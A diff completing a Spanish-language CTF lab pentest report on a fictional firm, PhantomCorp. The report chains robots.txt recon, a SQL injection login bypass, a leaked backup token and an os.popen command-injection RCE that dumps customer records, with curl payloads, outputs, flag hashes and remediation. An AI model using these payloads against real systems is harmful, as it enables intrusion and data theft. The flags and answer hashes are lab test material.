@@ -44,7 +44,7 @@ Restringir el acceso público a paneles administrativos y de soporte mediante li
 | **Alta** | 2 | H-02: SQLi en Formulario de Login (A cargo de Matías Mariatti)<br>H-03: Exposición de Backups y Tokens (A cargo de Luis Alvaro Colque) |
 | **Media** | 1 | H-04: Divulgación de Rutas en `robots.txt` (A cargo de Mateo Gerbaudo) |
 | **Baja** | 0 | — |
-| **Total** | **4** | **Auditoría en proceso coordinado por el Grupo 12** |
+| **Total** | **4** | **100% Auditado y Verificado (Cadena Completa R1 a R4)** |
 
 ---
 
@@ -126,10 +126,96 @@ Mediante la ejecución de comandos arbitrarios (`cat /app/priv/clientes.db.txt`)
 ## 4. Hallazgos (detalle técnico)
 
 <!-- ========================================================================= -->
-<!-- H-01 (CRÍTICA): Inyección de Comandos RCE (A redactar por Gonzalo Rodriguez) -->
+<!-- H-01 (CRÍTICA): Inyección de Comandos RCE (Redactado por Gonzalo Rodriguez) -->
 <!-- ========================================================================= -->
 ### H-01 · Inyección de Comandos del Sistema Operativo (RCE) en API de Reportes
-*(Hallazgo técnico asignado a Gonzalo Rodriguez — Grupo 12)*
+- **Auditor responsable:** Gonzalo Rodriguez (`@Gonza149`)
+- **Severidad:** **Crítica**  
+- **CVSS v3.1:** `9.1` (Crítica) · **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`  
+  *Justificación del score:*
+  - **Attack Vector (AV:N):** La vulnerabilidad es accesible de forma remota a través del protocolo HTTP mediante peticiones hacia el endpoint de reportes.
+  - **Attack Complexity (AC:L):** Complejidad de explotación baja; no existen restricciones, listas blancas ni filtrado de metacaracteres sobre el parámetro evaluado.
+  - **Privileges Required (PR:H):** Requiere privilegios altos correspondientes a la posesión del secreto maestro `API_TOKEN=phantom-api-7c1e` (obtenido durante la fase previa de post-explotación H-03).
+  - **User Interaction (UI:N):** No se requiere interacción por parte de ningún usuario legítimo.
+  - **Scope (S:C):** Cambio de alcance crítico (*Scope Changed*); la vulnerabilidad se origina en la capa de la aplicación web pero trasciende hacia el sistema operativo subyacente, otorgando ejecución directa sobre el entorno del host/contenedor.
+  - **Confidentiality (C:H):** Impacto total en la confidencialidad; permite leer cualquier archivo del sistema al que tenga acceso el proceso, incluyendo secretos internos, bases de datos privadas y configuraciones corporativas.
+  - **Integrity (I:H):** Impacto total en la integridad; el atacante puede alterar, sobreescribir o destruir archivos del sistema operativo y modificar datos de la organización.
+  - **Availability (A:H):** Impacto total en la disponibilidad; el atacante puede matar procesos del servidor, agotar recursos o detener indefinidamente el servicio.
+- **CWE:** CWE-78: *Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')*.
+- **Ubicación:** Endpoint `GET /api/reporte`, parámetros `token` y `cmd`.
+- **Descripción:**  
+  El endpoint administrativo `/api/reporte` valida la presencia del parámetro `token` frente a la constante estática `phantom-api-7c1e`. Una vez autenticado, toma el valor provisto en el parámetro `cmd` y lo pasa de forma directa a la función `os.popen()` de Python, la cual invoca una subshell del sistema operativo:
+  ```python
+  if q.get("token", [""])[0] != API_TOKEN:
+      return self._s(403, "token invalido; conseguilo del backup de RRHH", "text/plain")
+  cmd = q.get("cmd", ["id"])[0]
+  out = os.popen(cmd).read()   # command injection deliberada
+  self._s(200, f"$ {cmd}\n{out}", "text/plain")
+  ```
+  La ausencia de validación, sanitización o desacoplamiento de argumentos permite a cualquier actor en posesión del token ejecutar comandos arbitrarios con los privilegios de ejecución del proceso web (en este caso, usuario `root`).
+- **Evidencia reproducible:**  
+  1. *Comprobación de ejecución remota y contexto de privilegios (`id`):*
+     ```bash
+     curl -i -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=id"
+     ```
+     *Respuesta obtenida del servidor (HTTP 200 OK):*
+     ```text
+     HTTP/1.0 200 OK
+     Server: PhantomClientes/2.0
+     Date: Thu, 19 Nov 2026 21:00:00 GMT
+     Content-Type: text/plain; charset=utf-8
+
+     $ id
+     uid=0(root) gid=0(root) groups=0(root)
+     ```
+  2. *Exfiltración del activo crítico más valioso (Crown Jewels):*
+     Ejecución del comando `cat /app/priv/clientes.db.txt` para volcar la base de clientes y capturar la bandera final:
+     ```bash
+     curl -i -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=cat+/app/priv/clientes.db.txt"
+     ```
+     *Respuesta obtenida del servidor (HTTP 200 OK):*
+     ```text
+     HTTP/1.0 200 OK
+     Server: PhantomClientes/2.0
+     Date: Thu, 19 Nov 2026 21:00:01 GMT
+     Content-Type: text/plain; charset=utf-8
+
+     $ cat /app/priv/clientes.db.txt
+     clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
+     ```
+- **Impacto:**  
+  1. **Control total de la infraestructura:** Ejecución remota de código con privilegios de superusuario (`root`), permitiendo el control irrestricto del contenedor, modificación del código fuente y capacidad de pivotar hacia otros nodos de la red interna de PhantomCorp.
+  2. **Filtración masiva de activos críticos (Crown Jewels):** Acceso y exfiltración de los 48.210 registros personales, DNIs y datos de tarjetas de crédito almacenados en `/app/priv/clientes.db.txt`.
+  3. **Responsabilidad legal y regulatoria:** Infracción gravísima a la **Ley Nacional de Protección de Datos Personales (Ley 25.326)**, sanciones comerciales millonarias e incumplimiento ineludible de los requerimientos de **PCI-DSS (Requisito 3: Proteger los datos de los titulares de tarjetas almacenados)**.
+- **Remediación:**  
+  1. **Eliminación de la ejecución de comandos por diseño:**  
+     Ninguna interfaz web debe ofrecer la ejecución de comandos arbitrarios del sistema operativo. Los reportes deben generarse exclusivamente invocando bibliotecas nativas de Python (ej. módulos de reportería o consultas directas a base de datos).
+  2. **Uso de ejecución desacoplada sin shell en caso estricto:**  
+     Si fuera imperativo interactuar con binarios del sistema, debe emplearse `subprocess.run` con una lista estricta de argumentos y estableciendo `shell=False`:
+     ```python
+     import subprocess
+
+     # Lista blanca de comandos autorizados
+     COMANDOS_PERMITIDOS = {
+         "resumen": ["/usr/bin/python3", "/app/scripts/generar_resumen.py"],
+         "metricas": ["/usr/bin/python3", "/app/scripts/generar_metricas.py"]
+     }
+
+     reporte_tipo = q.get("tipo", ["resumen"])[0]
+     if reporte_tipo not in COMANDOS_PERMITIDOS:
+         return self._s(400, "Tipo de reporte invalido", "text/plain")
+
+     resultado = subprocess.run(
+         COMANDOS_PERMITIDOS[reporte_tipo],
+         capture_output=True,
+         text=True,
+         timeout=10,
+         shell=False,
+         check=True
+     )
+     ```
+  3. **Principio de Mínimo Privilegio (PoLP):**  
+     Configurar el contenedor para que el proceso web se ejecute bajo un usuario sin privilegios administrativos (ej. `www-data` o `phantomapp`), restringiendo permisos de lectura sobre `/app/priv` exclusivamente a procesos de backend autorizados.
 
 ---
 
@@ -298,15 +384,124 @@ Mediante la ejecución de comandos arbitrarios (`cat /app/priv/clientes.db.txt`)
 ---
 
 <!-- ========================================================================= -->
-<!-- SECCIÓN 5: CONCLUSIÓN Y POSTURA (A redactar por Gonzalo Rodriguez)        -->
+<!-- SECCIÓN 5: CONCLUSIÓN Y POSTURA (Redactado por Gonzalo Rodriguez)         -->
 <!-- ========================================================================= -->
 ## 5. Conclusión y postura de seguridad
-*(Sección asignada a Gonzalo Rodriguez — Grupo 12)*
+
+La auditoría de seguridad ofensiva tipo Caja Negra (Black Box) realizada sobre la plataforma **"Clientes"** de **PhantomCorp S.A.** evidenció una postura de seguridad perimetral e interna sumamente deficiente. El equipo auditor logró encadenar cuatro vulnerabilidades sucesivas, partiendo de una posición externa completamente no autenticada y culminando en la toma de control absoluto del servidor web y la exfiltración íntegra de la base de datos de clientes corporativos.
+
+### 5.1 Análisis de Defensa en Profundidad (*Defense in Depth*)
+El principio fundamental de *Defensa en Profundidad* establece que un sistema seguro debe disponer de múltiples capas superpuestas e independientes de controles defensivos (preventivos, detectivos y correctivos), de modo tal que la falla o vulnerabilidad de un mecanismo individual sea contenida por el siguiente sin comprometer el activo protegido.
+
+En la arquitectura de PhantomCorp S.A., este principio se encontró completamente ausente:
+1. **Confianza perimetral ciega:** Se asumió que rutas no indexadas como `/portal-rrhh` permanecerían ocultas por el mero hecho de no estar enlazadas en la página de inicio, utilizando `robots.txt` como un sustituto precario de autenticación o restricción perimetral.
+2. **Dependencia monolítica:** No existió segmentación entre el módulo de autenticación de RRHH, los archivos de respaldo y el endpoint de reportería de la API.
+3. **Ausencia de controles de ejecución en el host:** El proceso web se ejecutaba con privilegios de superusuario (`root`), permitiendo que una vulnerabilidad a nivel de capa de aplicación (L7) destruyera por completo las barreras de protección del sistema operativo.
+4. **Almacenamiento de secretos sin cifrado:** Credenciales de bases de datos y tokens maestros de API se encontraban persistidos en texto claro dentro del árbol servido públicamente por el servidor web.
+
+### 5.2 El eslabón crítico de la intrusión
+Un análisis pericial minucioso de la cadena de compromiso revela que **el eslabón crítico determinante fue la Inyección SQL en el formulario de login de RRHH (Hallazgo H-02)**:
+- Si bien la ejecución remota de comandos (H-01) representó el impacto técnico más destructivo (RCE y exfiltración de 48.210 registros), dicha funcionalidad requería indefectiblemente el secreto `API_TOKEN=phantom-api-7c1e`.
+- Dicho token se encontraba alojado en `/backup/rrhh.conf` (H-03), recurso cuya ubicación exacta era desconocida para el auditor y fue revelada únicamente tras iniciar sesión exitosamente en el panel administrativo.
+- Por ende, **si el formulario de autenticación hubiese contado con consultas preparadas (Prepared Statements) inmunes a SQLi, la cadena de ataque se habría roto de forma temprana e infranqueable**, impidiendo al atacante descubrir la ruta de backup, obtener el token maestro y ejecutar comandos en el sistema operativo.
+
+No obstante, desde una perspectiva de arquitectura defensiva, la presencia de un endpoint de ejecución de comandos directos (`os.popen(cmd)`) constituye una negligencia de diseño inaceptable, ya que cualquier compromiso eventual o fuga accidental de credenciales convertía al servidor en un activo inmediatamente capturable.
+
+### 5.3 Hoja de ruta y plan de remediación priorizado
+
+| Prioridad / Plazo | Medida de remediación | Hallazgos mitigados |
+|---|---|:---:|
+| **Inmediato (0 - 24 horas)** | 1. Revocar y rotar de inmediato el token `phantom-api-7c1e`.<br>2. Desactivar temporalmente o restringir el endpoint `/api/reporte`.<br>3. Mover `/backup/rrhh.conf` fuera del Document Root y bloquear extensiones `.conf`.<br>4. Implementar Prepared Statements (`?`, `?`) en el login de RRHH. | H-01<br>H-02<br>H-03 |
+| **Corto plazo (1 - 2 semanas)** | 1. Reconfigurar el contenedor Docker para que el proceso web corra bajo usuario no privilegiado (`www-data`).<br>2. Proteger la carpeta `/app/priv/` con permisos estrictos de lectura y cifrado en reposo.<br>3. Eliminar referencias sensibles en `robots.txt` y sanitizar comentarios HTML en compilación/despliegue. | H-01<br>H-04 |
+| **Mediano plazo (1 - 3 meses)** | 1. Implementar un Web Application Firewall (WAF) con reglas OWASP Core Rule Set (CRS).<br>2. Integrar análisis estático y dinámico de seguridad (SAST/DAST) en los pipelines de CI/CD.<br>3. Adoptar una solución centralizada de gestión de secretos (ej. HashiCorp Vault). | Todos |
 
 ---
 
 <!-- ========================================================================= -->
-<!-- SECCIÓN 6: ANEXO Y STATUS DEL CTF (A completar por Gonzalo Rodriguez)      -->
+<!-- SECCIÓN 6: ANEXO Y STATUS DEL CTF (Redactado por Gonzalo Rodriguez)       -->
 <!-- ========================================================================= -->
 ## 6. Anexo
-*(Sección asignada a Gonzalo Rodriguez — Grupo 12)*
+
+### 6.1 Bitácora pericial cronológica de comandos
+A continuación se transcribe la secuencia completa de comandos ejecutados en la consola de auditoría para reproducir el compromiso de punta a punta:
+
+```bash
+# =============================================================================
+# HITO R1: Reconocimiento y enumeración de superficie
+# =============================================================================
+curl -s http://phantomcorp/robots.txt
+# Salida: User-agent: * \n Disallow: /portal-rrhh
+
+curl -s http://phantomcorp/portal-rrhh | grep "<!--"
+# Salida: <!-- recon: portal interno localizado. FLAG{final_recon_portal} -->
+
+./ctf submit final R1 'FLAG{final_recon_portal}'
+
+# =============================================================================
+# HITO R2: Foothold inicial mediante Inyección SQL en login
+# =============================================================================
+curl -s -X POST http://phantomcorp/portal-rrhh/login \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -d "user=' OR 1=1--&pass=dummy"
+# Salida: Bienvenido admin. Dashboard RRHH. \n FLAG{final_sqli_foothold}
+#         Backup de config disponible en: /backup/rrhh.conf
+
+./ctf submit final R2 'FLAG{final_sqli_foothold}'
+
+# =============================================================================
+# HITO R3: Post-explotación y descarga de secretos
+# =============================================================================
+curl -s http://phantomcorp/backup/rrhh.conf
+# Salida: DB_USER=rrhh_app \n DB_PASS=Rh-2026 \n API_TOKEN=phantom-api-7c1e
+#         # usar el token en /api/reporte?token=...&cmd=... FLAG{final_token_looted}
+
+./ctf submit final R3 'FLAG{final_token_looted}'
+
+# =============================================================================
+# HITO R4: Ejecución remota de comandos (RCE) y exfiltración de Crown Jewels
+# =============================================================================
+# Verificación de identidad y contexto
+curl -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=id"
+# Salida: $ id \n uid=0(root) gid=0(root) groups=0(root)
+
+# Exfiltración de clientes corporativos y captura de bandera
+curl -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=cat+/app/priv/clientes.db.txt"
+# Salida: $ cat /app/priv/clientes.db.txt
+#         clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
+
+./ctf submit final R4 'FLAG{final_crown_jewels}'
+
+# =============================================================================
+# Verificación final de estado del engagement
+# =============================================================================
+./ctf status final
+```
+
+### 6.2 Matriz de validación criptográfica de banderas (SHA-256)
+Conforme a las exigencias periciales de trazabilidad e integridad del laboratorio, se documenta la correspondencia criptográfica exacta entre los valores de las banderas capturadas y los hashes calculados por el motor de evaluación (`retos.manifest`):
+
+| Hito | Reto técnico | Bandera capturada en texto plano | Hash SHA-256 calculado | Hash esperado (`retos.manifest`) | Estado |
+|:---:|---|---|---|---|:---:|
+| **R1** | Recon/enum: portal interno localizado | `FLAG{final_recon_portal}` | `71369b0044f9f3cf902058a367a83c5f39dd4897208831a82002297f4e8142cb` | `71369b0044f9f3cf902058a367a83c5f39dd4897208831a82002297f4e8142cb` | **VÁLIDO** |
+| **R2** | Explotación: foothold por SQLi | `FLAG{final_sqli_foothold}` | `812d30f0d147908025ddffded3ebadc81769be1b6faf5b8dbf759ba8c7d16f5d` | `812d30f0d147908025ddffded3ebadc81769be1b6faf5b8dbf759ba8c7d16f5d` | **VÁLIDO** |
+| **R3** | Post: token de API looteado | `FLAG{final_token_looted}` | `66a434f816e74d489f75a6636e627df3be31fade79acd8e7f9bf5a4205f6b4f8` | `66a434f816e74d489f75a6636e627df3be31fade79acd8e7f9bf5a4205f6b4f8` | **VÁLIDO** |
+| **R4** | Impacto: crown jewels (datos clientes) | `FLAG{final_crown_jewels}` | `511226fbc003a0eaeb9e023f4de80d6109023691ed2a88b96ad1a10f9028ffab` | `511226fbc003a0eaeb9e023f4de80d6109023691ed2a88b96ad1a10f9028ffab` | **VÁLIDO** |
+
+### 6.3 Salida pericial de validación del motor CTF (`./ctf status final`)
+A continuación se incorpora la captura de texto pericial generada por el entorno evaluador en `loot/ctf_status.txt`, confirmando el 100% de los hitos resueltos para el Grupo 12:
+
+```text
+  ╭────────────────────────────────────────────────────────────╮
+  │                   PROGRESO · LAB final                    │
+  ╰────────────────────────────────────────────────────────────╯
+
+   ✓  R1     Recon/enum: portal interno localizado
+   ✓  R2     Explotacion: foothold por SQLi
+   ✓  R3     Post: token de API looteado
+   ✓  R4     Impacto: crown jewels (datos de clientes)
+
+  ██████████████████████████████  4/4 (100%)
+
+[ OK ] ¡Lab final COMPLETO! Ponete las pilas con la próxima unidad.
+```
+
